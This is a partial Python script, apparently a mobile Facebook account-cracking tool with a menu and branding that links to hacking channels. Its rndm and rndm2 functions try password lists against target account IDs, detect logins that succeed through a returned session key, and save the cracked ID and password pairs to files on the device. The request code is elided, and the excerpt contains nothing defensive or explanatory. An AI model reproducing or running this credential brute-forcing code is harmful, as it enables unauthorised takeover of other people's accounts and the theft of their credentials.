...
#os.system('xdg-open  https://youtube.com/@afghantechnical172?si=N113Fd2mPf0ZCJlu')
...
def menu():
			...
			print('\033[1;33m------------------------------------------------')
			xd=input(' CHOOSE: ')
			#os.system('xdg-open   https://www.facebook.com/profile.php?id=100023550944914')
			if xd in ['1','01']:
				awmafghan()
			if xd in ['02','2']:
				awmafghan1()
			if xd in ['04','4']:
				#os.system('xdg-open  https://t.me/SABAWOON_HACK_001')
				print('\033[1;37m')
				print('\033[1;33m------------------------------------------------')
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [Niazi-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Niazi-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Niazi-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/Niazi-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Niazi-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Niazi-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [Niazi-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
